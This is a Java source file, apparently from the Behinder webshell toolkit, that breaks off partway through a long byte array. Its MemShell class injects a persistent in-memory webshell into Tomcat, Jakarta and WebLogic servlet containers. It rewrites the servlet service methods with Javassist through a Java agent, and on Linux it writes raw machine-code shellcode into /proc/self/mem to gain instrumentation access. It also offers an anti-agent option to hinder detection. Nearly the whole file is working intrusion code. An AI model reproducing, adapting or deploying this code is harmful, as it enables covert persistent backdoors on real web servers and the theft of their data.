package net.rebeyond.behinder.resource.tools;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.RandomAccessFile;
import java.lang.instrument.ClassDefinition;
import java.lang.instrument.Instrumentation;
import java.lang.management.ManagementFactory;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.net.URI;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.nio.file.FileSystem;
import java.nio.file.FileSystems;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.Random;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtMethod;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import net.rebeyond.behinder.utils.ServerDetector;
import sun.misc.Unsafe;

public class MemShell extends ClassLoader {
   public static String whatever;
   private Object Request;
   private Object Response;
   private Object Session;
   public static String action;
   public static String type;
   public static String className;
   public static String classBody;
   public static String libPath;
   public static String password;
   public static String antiAgent;
   public static String shellCode;
   public static String decryptClassStr;
   public static String decryptName;
   public static String path;
   private int pointerLength = 8;
   private static final int SHT_DYNSYM = 11;
   private static final int STT_FUNC = 2;
   private static final int STT_GNU_IFUNC = 10;

   public Class parse(byte[] b) {
      return super.defineClass(b, 0, b.length);
   }

   public MemShell(ClassLoader c) {
      super(c);
   }

   public MemShell() {
   }

   public boolean equals(Object obj) {
      HashMap result = new HashMap();
      boolean var21 = false;

      Object so;
      Method write;
      label165: {
         try {
            var21 = true;
            System.setProperty("jdk.attach.allowAttachSelf", "true");
            this.fillContext(obj);
            if (action.equals("get")) {
               String[] targetClassArr = new String[]{"/weblogic/servlet/internal/ServletStubImpl.class", "/jakarta/servlet/http/HttpServlet.class", "/javax/servlet/http/HttpServlet.class"};
               String[] var4 = targetClassArr;
               int var5 = targetClassArr.length;

               for(int var6 = 0; var6 < var5; ++var6) {
                  String targetClass = var4[var6];
                  InputStream input = this.getClass().getResourceAsStream(targetClass);
                  if (input != null) {
                     ByteArrayOutputStream bos = new ByteArrayOutputStream();
                     byte[] buf = new byte[1024];

                     for(int length = input.read(buf); length > 0; length = input.read(buf)) {
                        bos.write(buf, 0, length);
                     }

                     Map classObj = new HashMap();
                     classObj.put("className", targetClass);
                     classObj.put("classBody", base64encode(bos.toByteArray()));
                     result.put("status", "success");
                     result.put("msg", this.buildJson(classObj, false));
                     var21 = false;
                     break label165;
                  }
               }

               var21 = false;
               break label165;
            }

            if (action.equals("injectAgentNoFile")) {
               this.enableAttachSelf();
               this.doInjectAgentNoFile(className, base64decode(classBody), Boolean.parseBoolean(antiAgent));
               result.put("status", "success");
               result.put("msg", "");
               var21 = false;
            } else if (action.equals("injectAgent")) {
               this.doInjectAgent(Boolean.parseBoolean(antiAgent));
               result.put("status", "success");
               result.put("msg", "MemShell Agent Injected Successfully.");
               var21 = false;
            } else if (type.equals("injectFilter")) {
               result.put("status", "success");
               result.put("msg", "MemShell Agent Injected Successfully.");
               var21 = false;
            } else if (type.equals("Filter")) {
               var21 = false;
            } else {
               if (type.equals("Servlet")) {
               }

               var21 = false;
            }
            break label165;
         } catch (Throwable var25) {
            result.put("status", "fail");
            result.put("msg", var25.getMessage());
            var25.printStackTrace();
            var21 = false;
         } finally {
            if (var21) {
               try {
                  so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
                  write = so.getClass().getMethod("write", byte[].class);
                  write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
                  so.getClass().getMethod("flush").invoke(so);
                  so.getClass().getMethod("close").invoke(so);
               } catch (Exception var22) {
               }

            }
         }

         try {
            so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
            write = so.getClass().getMethod("write", byte[].class);
            write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
            so.getClass().getMethod("flush").invoke(so);
            so.getClass().getMethod("close").invoke(so);
         } catch (Exception var23) {
         }

         return true;
      }

      try {
         so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
         write = so.getClass().getMethod("write", byte[].class);
         write.invoke(so, this.Encrypt(this.buildJson(result, true).getBytes("UTF-8")));
         so.getClass().getMethod("flush").invoke(so);
         so.getClass().getMethod("close").invoke(so);
      } catch (Exception var24) {
      }

      return true;
   }

   public static void agentmain(String args, Instrumentation inst) {
      Class[] cLasses = inst.getAllLoadedClasses();
      byte[] data = new byte[0];
      Map targetClasses = new HashMap();
      Map targetClassJavaxMap = new HashMap();
      targetClassJavaxMap.put("methodName", "service");
      List paramJavaxClsStrList = new ArrayList();
      paramJavaxClsStrList.add("javax.servlet.ServletRequest");
      paramJavaxClsStrList.add("javax.servlet.ServletResponse");
      targetClassJavaxMap.put("paramList", paramJavaxClsStrList);
      targetClasses.put("javax.servlet.http.HttpServlet", targetClassJavaxMap);
      Map targetClassJakartaMap = new HashMap();
      targetClassJakartaMap.put("methodName", "service");
      List paramJakartaClsStrList = new ArrayList();
      paramJakartaClsStrList.add("jakarta.servlet.ServletRequest");
      paramJakartaClsStrList.add("jakarta.servlet.ServletResponse");
      targetClassJakartaMap.put("paramList", paramJakartaClsStrList);
      targetClasses.put("javax.servlet.http.HttpServlet", targetClassJavaxMap);
      targetClasses.put("jakarta.servlet.http.HttpServlet", targetClassJakartaMap);
      ClassPool cPool = ClassPool.getDefault();
      if (ServerDetector.isWebLogic()) {
         targetClasses.clear();
         Map targetClassWeblogicMap = new HashMap();
         targetClassWeblogicMap.put("methodName", "execute");
         List paramWeblogicClsStrList = new ArrayList();
         paramWeblogicClsStrList.add("javax.servlet.ServletRequest");
         paramWeblogicClsStrList.add("javax.servlet.ServletResponse");
         targetClassWeblogicMap.put("paramList", paramWeblogicClsStrList);
         targetClasses.put("weblogic.servlet.internal.ServletStubImpl", targetClassWeblogicMap);
      }

      Class[] var22 = cLasses;
      int var23 = cLasses.length;

      for(int var12 = 0; var12 < var23; ++var12) {
         Class cls = var22[var12];
         if (targetClasses.keySet().contains(cls.getName())) {
            String targetClassName = cls.getName();

            try {
               shellCode = String.format(shellCode, path, decryptClassStr, decryptName);
               if (targetClassName.equals("jakarta.servlet.http.HttpServlet")) {
                  shellCode = shellCode.replace("javax.servlet", "jakarta.servlet");
               }

               ClassClassPath classPath = new ClassClassPath(cls);
               cPool.insertClassPath(classPath);
               cPool.importPackage("java.lang.reflect.Method");
               cPool.importPackage("javax.crypto.Cipher");
               List paramClsList = new ArrayList();
               Iterator var17 = ((List)((Map)targetClasses.get(targetClassName)).get("paramList")).iterator();

               String methodName;
               while(var17.hasNext()) {
                  methodName = (String)var17.next();
                  paramClsList.add(cPool.get(methodName));
               }

               CtClass cClass = cPool.get(targetClassName);
               methodName = ((Map)targetClasses.get(targetClassName)).get("methodName").toString();
               CtMethod cMethod = cClass.getDeclaredMethod(methodName, (CtClass[])paramClsList.toArray(new CtClass[paramClsList.size()]));
               cMethod.insertBefore(shellCode);
               cClass.detach();
               data = cClass.toBytecode();
               inst.redefineClasses(new ClassDefinition[]{new ClassDefinition(cls, data)});
            } catch (Exception var20) {
               var20.printStackTrace();
            } catch (Error var21) {
               var21.printStackTrace();
            }
         }
      }

   }

   private static void modifyJar(String pathToJAR, String pathToClassInsideJAR, byte[] classBytes) throws Exception {
      String classFileName = pathToClassInsideJAR.replace("\\", "/").substring(0, pathToClassInsideJAR.lastIndexOf(47));
      FileOutputStream fos = new FileOutputStream(classFileName);
      fos.write(classBytes);
      fos.flush();
      fos.close();
      Map launchenv = new HashMap();
      URI launchuri = URI.create("jar:" + (new File(pathToJAR)).toURI());
      launchenv.put("create", "true");
      FileSystem zipfs = FileSystems.newFileSystem(launchuri, launchenv);

      try {
         Path externalClassFile = Paths.get(classFileName);
         Path pathInJarfile = zipfs.getPath(pathToClassInsideJAR);
         Files.copy(externalClassFile, pathInJarfile, StandardCopyOption.REPLACE_EXISTING);
      } catch (Throwable var11) {
         if (zipfs != null) {
            try {
               zipfs.close();
            } catch (Throwable var10) {
               var11.addSuppressed(var10);
            }
         }

         throw var11;
      }

      if (zipfs != null) {
         zipfs.close();
      }

   }

   public void doInjectAgent(boolean antiAgent) throws Exception {
      try {
         this.enableAttachSelf();
         Class VirtualMachineCls = ClassLoader.getSystemClassLoader().loadClass("com.sun.tools.attach.VirtualMachine");
         Method attachMethod = VirtualMachineCls.getDeclaredMethod("attach", String.class);
         Method loadAgentMethod = VirtualMachineCls.getDeclaredMethod("loadAgent", String.class, String.class);
         Object obj = attachMethod.invoke(VirtualMachineCls, getCurrentPID());
         loadAgentMethod.invoke(obj, libPath, base64encode(path) + "|" + password + "|Decrypt");
         if (antiAgent) {
            this.antiAgentLinux();
         }
      } catch (Exception var10) {
         var10.printStackTrace();
      } catch (Error var11) {
         var11.printStackTrace();
      } finally {
         (new File(libPath)).delete();
      }

   }

   private void agentForLinux(String className, byte[] classBody, boolean antiAgent) throws Exception {
      FileReader fin = new FileReader("/proc/self/maps");
      BufferedReader reader = new BufferedReader(fin);
      long RandomAccessFile_length = 0L;
      long JNI_GetCreatedJavaVMs = 0L;

      String line;
      while((line = reader.readLine()) != null) {
         String[] splits = line.trim().split(" ");
         String[] addr_range;
         long libbase;
         String elfpath;
         if (line.endsWith("libjava.so") && RandomAccessFile_length == 0L) {
            addr_range = splits[0].split("-");
            libbase = Long.parseLong(addr_range[0], 16);
            elfpath = splits[splits.length - 1];
            RandomAccessFile_length = find_symbol(elfpath, "Java_java_io_RandomAccessFile_length", libbase);
         } else if (line.endsWith("libjvm.so") && JNI_GetCreatedJavaVMs == 0L) {
            addr_range = splits[0].split("-");
            libbase = Long.parseLong(addr_range[0], 16);
            elfpath = splits[splits.length - 1];
            JNI_GetCreatedJavaVMs = find_symbol(elfpath, "JNI_GetCreatedJavaVMs", libbase);
         }

         if (JNI_GetCreatedJavaVMs != 0L && RandomAccessFile_length != 0L) {
            break;
         }
      }

      fin.close();
      System.out.printf("Java_java_io_RandomAccessFile_length 0x%x\n", RandomAccessFile_length);
      System.out.printf("JNI_GetCreatedJavaVMs 0x%x\n", JNI_GetCreatedJavaVMs);
      RandomAccessFile fout = new RandomAccessFile("/proc/self/mem", "rw");
      byte[] stack_align = new byte[]{85, 72, -119, -27, 72, -57, -64, 15, 0, 0, 0, 72, -9, -48};
      byte[] movabs_rax = new byte[]{72, -72};
      ByteBuffer buffer = ByteBuffer.allocate(8);
      buffer.order(ByteOrder.LITTLE_ENDIAN);
      buffer.putLong(0, JNI_GetCreatedJavaVMs);
      byte[] b = new byte[]{72, -125, -20, 64, 72, 49, -10, 72, -1, -58, 72, -115, 84, 36, 4, 72, -115, 124, 36, 8, -1, -48, 72, -117, 124, 36, 8, 72, -115, 116, 36, 16, -70, 0, 2, 1, 48, 72, -117, 7, -1, 80, 48, 72, -117, 68, 36, 16, 72, -125, -60, 64, -55, -61};
      int shellcode_len = b.length + 8 + movabs_rax.length + stack_align.length;
      byte[] backup = new byte[shellcode_len];
      fout.seek(RandomAccessFile_length);
      fout.read(backup);
      fout.seek(RandomAccessFile_length);
      fout.write(stack_align);
      fout.write(movabs_rax);
      fout.write(buffer.array());
      fout.write(b);
      fout.close();
      long native_jvmtienv = fout.length();
      System.out.printf("native_jvmtienv %x\n", native_jvmtienv);
      fout = new RandomAccessFile("/proc/self/mem", "rw");
      fout.seek(RandomAccessFile_length);
      fout.write(backup);
      fout.close();
      Unsafe unsafe = null;

      try {
         Field field = Unsafe.class.getDeclaredField("theUnsafe");
         field.setAccessible(true);
         unsafe = (Unsafe)field.get((Object)null);
      } catch (Exception var31) {
         throw new AssertionError(var31);
      }

      unsafe.putByte(native_jvmtienv + 361L, (byte)2);
      long JPLISAgent = unsafe.allocateMemory(4096L);
      unsafe.putLong(JPLISAgent + 8L, native_jvmtienv);

      try {
         Class instrument_clazz = Class.forName("sun.instrument.InstrumentationImpl");
         Constructor constructor = instrument_clazz.getDeclaredConstructor(Long.TYPE, Boolean.TYPE, Boolean.TYPE);
         constructor.setAccessible(true);
         Object inst = constructor.newInstance(JPLISAgent, true, false);
         ClassDefinition definition = new ClassDefinition(Class.forName(className), classBody);
         Method redefineClazz = instrument_clazz.getMethod("redefineClasses", ClassDefinition[].class);
         redefineClazz.invoke(inst, new ClassDefinition[]{definition});
      } catch (Exception var30) {
         var30.printStackTrace();
      }

      fout.getFD();
      if (antiAgent) {
         this.antiAgentLinux();
      }

   }

   private void agentForWindow(String className, byte[] classBody, boolean antiAgent) throws Throwable {
      byte[] inject = new byte[]{-54, -2, -70, -66, 0, 0, 0, 50, 0, -57, 7, 0, 2, 1, 0, 38, 115, 117, 110, 47, 116, 111, 111, 108, 115, 47, 97, 116, 116, 97, 99, 104, 47, 87, 105, 110, 100, 111, 119, 115, 86, 105, 114, 116, 117, 97, 108, 77, 97, 99, 104, 105, 110, 101, 7, 0, 4, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 1, 0, 13, 112, 111, 105, 110, 116, 101, 114, 76, 101, 110, 103, 116, 104, 1, 0, 1, 73, 1, 0, 9, 99, 108, 97, 115, 115, 78, 97, 109, 101, 1, 0, 18, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 1, 0, 9, 99, 108, 97, 115, 115, 66, 111, 100, 121, 1, 0, 2, 91, 66, 1, 0, 8, 60, 99, 108, 105, 110, 105, 116, 62, 1, 0, 3, 40, 41, 86, 1, 0, 4, 67, 111, 100, 101, 9, 0, 1, 0, 15, 12, 0, 5, 0, 6, 1, 0, 15, 76, 105, 110, 101, 78, 117, 109, 98, 101, 114, 84, 97, 98, 108, 101, 1, 0, 18, 76, 111, 99, 97, 108, 86, 97, 114, 105, 97, 98, 108, 101, 84, 97, 98, 108, 101, 1, 0, 6, 60, 105, 110, 105, 116, 62, 10, 0, 3, 0, 20, 12, 0, 18, 0, 12, 1, 0, 4, 116, 104, 105, 115, 1, 0, 40, 76, 115, 117, 110, 47, 116, 111, 111, 108, 115, 47, 97, 116, 116, 97, 99, 104, 47, 87, 105, 110, 100, 111, 119, 115, 86, 105, 114, 116, 117, 97, 108, 77, 97, 99, 104, 105, 110, 101, 59, 1, 0, 7, 101, 110, 113, 117, 101, 117, 101, 1, 0, 61, 40, 74, 91, 66, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 91, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 59, 41, 86, 1, 0, 10, 69, 120, 99, 101, 112, 116, 105, 111, 110, 115, 7, 0, 27, 1, 0, 19, 106, 97, 118, 97, 47, 105, 111, 47, 73, 79, 69, 120, 99, 101, 112, 116, 105, 111, 110, 1, 0, 4, 119, 111, 114, 107, 7, 0, 30, 1, 0, 19, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 69, 120, 99, 101, 112, 116, 105, 111, 110, 7, 0, 32, 1, 0, 15, 115, 117, 110, 47, 109, 105, 115, 99, 47, 85, 110, 115, 97, 102, 101, 8, 0, 34, 1, 0, 9, 116, 104, 101, 85, 110, 115, 97, 102, 101, 10, 0, 36, 0, 38, 7, 0, 37, 1, 0, 15, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 67, 108, 97, 115, 115, 12, 0, 39, 0, 40, 1, 0, 16, 103, 101, 116, 68, 101, 99, 108, 97, 114, 101, 100, 70, 105, 101, 108, 100, 1, 0, 45, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 114, 101, 102, 108, 101, 99, 116, 47, 70, 105, 101, 108, 100, 59, 10, 0, 42, 0, 44, 7, 0, 43, 1, 0, 23, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 114, 101, 102, 108, 101, 99, 116, 47, 70, 105, 101, 108, 100, 12, 0, 45, 0, 46, 1, 0, 13, 115, 101, 116, 65, 99, 99, 101, 115, 115, 105, 98, 108, 101, 1, 0, 4, 40, 90, 41, 86, 10, 0, 42, 0, 48, 12, 0, 49, 0, 50, 1, 0, 3, 103, 101, 116, 1, 0, 38, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 59, 7, 0, 52, 1, 0, 24, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 65, 115, 115, 101, 114, 116, 105, 111, 110, 69, 114, 114, 111, 114, 10, 0, 51, 0, 54, 12, 0, 18, 0, 55, 1, 0, 21, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 59, 41, 86, 5, 0, 0, 0, 0, 0, 0, 16, 0, 10, 0, 31, 0, 59, 12, 0, 60, 0, 61, 1, 0, 14, 97, 108, 108, 111, 99, 97, 116, 101, 77, 101, 109, 111, 114, 121, 1, 0, 4, 40, 74, 41, 74, 10, 0, 1, 0, 63, 12, 0, 64, 0, 65, 1, 0, 28, 108, 111, 110, 103, 50, 66, 121, 116, 101, 65, 114, 114, 97, 121, 95, 76, 105, 116, 116, 108, 101, 95, 69, 110, 100, 105, 97, 110, 1, 0, 6, 40, 74, 73, 41, 91, 66, 10, 0, 1, 0, 67, 12, 0, 68, 0, 69, 1, 0, 12, 114, 101, 112, 108, 97, 99, 101, 66, 121, 116, 101, 115, 1, 0, 10, 40, 91, 66, 91, 66, 91, 66, 41, 91, 66, 9, 0, 1, 0, 71, 12, 0, 9, 0, 10, 8, 0, 73, 1, 0, 6, 97, 116, 116, 97, 99, 104, 10, 0, 75, 0, 77, 7, 0, 76, 1, 0, 16, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 121, 115, 116, 101, 109, 12, 0, 78, 0, 79, 1, 0, 11, 108, 111, 97, 100, 76, 105, 98, 114, 97, 114, 121, 1, 0, 21, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 86, 5, -1, -1, -1, -1, -1, -1, -1, -1, 8, 0, 23, 10, 0, 1, 0, 84, 12, 0, 23, 0, 24, 10, 0, 29, 0, 86, 12, 0, 87, 0, 12, 1, 0, 15, 112, 114, 105, 110, 116, 83, 116, 97, 99, 107, 84, 114, 97, 99, 101, 10, 0, 31, 0, 89, 12, 0, 90, 0, 61, 1, 0, 7, 103, 101, 116, 76, 111, 110, 103, 5, 0, 0, 0, 0, 0, 0, 0, -55, 10, 0, 31, 0, 94, 12, 0, 95, 0, 96, 1, 0, 7, 112, 117, 116, 66, 121, 116, 101, 1, 0, 5, 40, 74, 66, 41, 86, 5, 0, 0, 0, 0, 0, 0, 1, 105, 8, 0, 100, 1, 0, 34, 115, 117, 110, 46, 105, 110, 115, 116, 114, 117, 109, 101, 110, 116, 46, 73, 110, 115, 116, 114, 117, 109, 101, 110, 116, 97, 116, 105, 111, 110, 73, 109, 112, 108, 10, 0, 36, 0, 102, 12, 0, 103, 0, 104, 1, 0, 7, 102, 111, 114, 78, 97, 109, 101, 1, 0, 37, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 67, 108, 97, 115, 115, 59, 9, 0, 106, 0, 108, 7, 0, 107, 1, 0, 14, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 76, 111, 110, 103, 12, 0, 109, 0, 110, 1, 0, 4, 84, 89, 80, 69, 1, 0, 17, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 67, 108, 97, 115, 115, 59, 9, 0, 112, 0, 108, 7, 0, 113, 1, 0, 17, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 66, 111, 111, 108, 101, 97, 110, 10, 0, 36, 0, 115, 12, 0, 116, 0, 117, 1, 0, 22, 103, 101, 116, 68, 101, 99, 108, 97, 114, 101, 100, 67, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 1, 0, 51, 40, 91, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 67, 108, 97, 115, 115, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 114, 101, 102, 108, 101, 99, 116, 47, 67, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 59, 10, 0, 119, 0, 44, 7, 0, 120, 1, 0, 29, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 114, 101, 102, 108, 101, 99, 116, 47, 67, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 10, 0, 106, 0, 122, 12, 0, 123, 0, 124, 1, 0, 7, 118, 97, 108, 117, 101, 79, 102, 1, 0, 19, 40, 74, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 76, 111, 110, 103, 59, 10, 0, 112, 0, 126, 12, 0, 123, 0, 127, 1, 0, 22, 40, 90, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 66, 111, 111, 108, 101, 97, 110, 59, 10, 0, 119, 0, -127, 12, 0, -126, 0, -125, 1, 0, 11, 110, 101, 119, 73, 110, 115, 116, 97, 110, 99, 101, 1, 0, 39, 40, 91, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 59, 7, 0, -123, 1, 0, 36, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 105, 110, 115, 116, 114, 117, 109, 101, 110, 116, 47, 67, 108, 97, 115, 115, 68, 101, 102, 105, 110, 105, 116, 105, 111, 110, 9, 0, 1, 0, -121, 12, 0, 7, 0, 8, 10, 0, -124, 0, -119, 12, 0, 18, 0, -118, 1, 0, 22, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 67, 108, 97, 115, 115, 59, 91, 66, 41, 86, 8, 0, -116, 1, 0, 15, 114, 101, 100, 101, 102, 105, 110, 101, 67, 108, 97, 115, 115, 101, 115, 7, 0, -114, 1, 0, 39, 91, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 105, 110, 115, 116, 114, 117, 109, 101, 110, 116, 47, 67, 108, 97, 115, 115, 68, 101, 102, 105, 110, 105, 116, 105, 111, 110, 59, 10, 0, 36, 0, -112, 12, 0, -111, 0, -110, 1, 0, 9, 103, 101, 116, 77, 101, 116, 104, 111, 100, 1, 0, 64, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 91, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 67, 108, 97, 115, 115, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 114, 101, 102, 108, 101, 99, 116, 47, 77, 101, 116, 104, 111, 100, 59, 10, 0, -108, 0, -106, 7, 0, -107, 1, 0, 24, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 114, 101, 102, 108, 101, 99, 116, 47, 77, 101, 116, 104, 111, 100, 12, 0, -105, 0, -104, 1, 0, 6, 105, 110, 118, 111, 107, 101, 1, 0, 57, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 59, 91, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 59, 41, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 59, 10, 0, -102, 0, 86, 7, 0, -101, 1, 0, 19, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 84, 104, 114, 111, 119, 97, 98, 108, 101, 1, 0, 6, 117, 110, 115, 97, 102, 101, 1, 0, 17, 76, 115, 117, 110, 47, 109, 105, 115, 99, 47, 85, 110, 115, 97, 102, 101, 59, 1, 0, 5, 102, 105, 101, 108, 100, 1, 0, 25, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 114, 101, 102, 108, 101, 99, 116, 47, 70, 105, 101, 108, 100, 59, 1, 0, 1, 101, 1, 0, 21, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 69, 120, 99, 101, 112, 116, 105, 111, 110, 59, 1, 0, 10, 74, 80, 76, 73, 83, 65, 103, 101, 110, 116, 1, 0, 1, 74, 1, 0, 3, 98, 117, 102, 1, 0, 4, 115, 116, 117, 98, 1, 0, 15, 110, 97, 116, 105, 118, 101, 95, 106, 118, 109, 116, 105, 101, 110, 118, 1, 0, 16, 105, 110, 115, 116, 114, 117, 109, 101, 110, 116, 95, 99, 108, 97, 122, 122, 1, 0, 11, 99, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 1, 0, 31, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 114, 101, 102, 108, 101, 99, 116, 47, 67, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 59, 1, 0, 4, 105, 110, 115, 116, 1, 0, 18, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 59, 1, 0, 10, 100, 101, 102, 105, 110, 105, 116, 105, 111, 110, 1, 0, 38, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 105, 110, 115, 116, 114, 117, 109, 101, 110, 116, 47, 67, 108, 97, 115, 115, 68, 101, 102, 105, 110, 105, 116, 105, 111, 110, 59, 1, 0, 13, 114, 101, 100, 101, 102, 105, 110, 101, 67, 108, 97, 122, 122, 1, 0, 26, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 114, 101, 102, 108, 101, 99, 116, 47, 77, 101, 116, 104, 111, 100, 59, 1, 0, 5, 101, 114, 114, 111, 114, 1, 0, 21, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 84, 104, 114, 111, 119, 97, 98, 108, 101, 59, 1, 0, 22, 76, 111, 99, 97, 108, 86, 97, 114, 105, 97, 98, 108, 101, 84, 121, 112, 101, 84, 97, 98, 108, 101, 1, 0, 20, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 67, 108, 97, 115, 115, 60, 42, 62, 59, 1, 0, 34, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 114, 101, 102, 108, 101, 99, 116, 47, 67, 111, 110, 115, 116, 114, 117, 99, 116, 111, 114, 60, 42, 62, 59, 1, 0, 13, 83, 116, 97, 99, 107, 77, 97, 112, 84, 97, 98, 108, 101, 7, 0, 10, 1, 0, 1, 108, 1, 0, 6, 108, 101, 110, 103, 116, 104, 1, 0, 5, 97, 114, 114, 97, 121, 1, 0, 1, 105, 10, 0, 75, 0, -68, 12, 0, -67, 0, -66, 1, 0, 9, 97, 114, 114, 97, 121, 99, 111, 112, 121, 1, 0, 42, 40, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 59, 73, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 79, 98, 106, 101, 99, 116, 59, 73, 73, 41, 86, 1, 0, 5, 98, 121, 116, 101, 115, 1, 0, 10, 98, 121, 116, 101, 83, 111, 117, 114, 99, 101, 1, 0, 10, 98, 121, 116, 101, 84, 97, 114, 103, 101, 116, 1, 0, 2, 98, 108, 1, 0, 1, 90, 1, 0, 1, 106, 1, 0, 10, 83, 111, 117, 114, 99, 101, 70, 105, 108, 101, 1, 0, 26, 87, 105, 110, 100, 111, 119, 115, 86, 105, 114, 116, 117, 97, 108, 77, 97, 99, 104, 105, 110, 101, 46, 106, 97, 118, 97, 0, 33, 0, 1, 0, 3, 0, 0, 0, 3, 0, 9, 0, 5, 0, 6, 0, 0, 0, 9, 0, 7, 0, 8, 0, 0, 0, 9, 0, 9, 0, 10, 0, 0, 0, 6, 0, 8, 0, 11, 0, 12, 0, 1, 0, 13, 0, 0, 0, 42, 0, 1, 0, 0, 0, 0, 0, 6, 16, 8, -77, 0, 14, -79, 0, 0, 0, 2, 0, 16, 0, 0, 0, 10, 0, 2, 0, 0, 0, 20, 0, 5, 0, 22, 0, 17, 0, 0, 0, 2, 0, 0, 0, 1, 0, 18, 0, 12, 0, 1, 0, 13, 0, 0, 0, 47, 0, 1, 0, 1, 0, 0, 0, 5, 42, -73, 0, 19, -79, 0, 0, 0, 2, 0, 16, 0, 0, 0, 6, 0, 1, 0, 0, 0, 18, 0, 17, 0, 0, 0, 12, 0, 1, 0, 0, 0, 5, 0, 21, 0, 22, 0, 0, 1, -120, 0, 23, 0, 24, 0, 1, 0, 25, 0, 0, 0, 4, 0, 1, 0, 26, 0, 9, 0, 28, 0, 12, 0, 2, 0, 25, 0, 0, 0, 4, 0, 1, 0, 29, 0, 13, 0, 0, 18, 97, 0, 9, 0, 12, 0, 0, 16, -72, 1, 75, 18, 31, 18, 33, -74, 0, 35, 76, 43, 4, -74, 0, 41, 43, 1, -74, 0, 47, -64, 0, 31, 75, -89, 0, 13, 76, -69, 0, 51, 89, 43, -73, 0, 53, -65, 42, 20, 0, 56, -74, 0, 58, 64, 17, 1, 120, -68, 8, 89, 3, 16, 72, 84, 89, 4, 16, -125, 84, 89, 5, 16, -20, 84, 